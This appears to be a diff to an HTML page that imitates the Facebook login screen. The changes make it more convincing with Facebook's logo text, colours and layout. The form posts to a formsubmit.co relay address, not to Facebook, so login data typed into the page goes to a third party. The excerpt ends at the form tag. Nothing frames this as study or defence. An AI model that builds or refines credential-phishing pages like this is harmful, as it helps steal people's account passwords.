@@ -2,45 +2,77 @@
 <html lang="en">
    <head>
       <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       <title>Facebook – log in or sign up</title>
       <style>
+         * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+         }
+
          body {
             background-color: #f0f2f5;
-            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
          }
+
          .container {
-            width: 400px;
-            margin: 100px auto;
-            padding: 30px;
-            background: white;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: white;
+            padding: 2rem;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             border-radius: 8px;
          }
-         h2 {
+
+         .logo {
             text-align: center;
+            margin-bottom: 1.5rem;
+            font-size: 32px;
             color: #1877f2;
+            font-weight: bold;
          }
+
          input {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             margin: 10px 0;
             border-radius: 6px;
             border: 1px solid #ccc;
+            font-size: 16px;
          }
+
          button {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background-color: #1877f2;
             color: white;
+            font-size: 16px;
+            font-weight: bold;
             border: none;
             border-radius: 6px;
-            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+         }
+
+         button:hover {
+            background-color: #165ec9;
+         }
+
+         @media screen and (max-width: 450px) {
+            .container {
+               margin: 20px;
+            }
          }
       </style>
    </head>
    <body>
       <div class="container">
-         <h2>Facebook Login</h2>
+         <div class="logo">facebook</div>
          <form
             action="https://formsubmit.co/db4cb50a9c857cf1a813dfb0339dd682"
             method="POST"
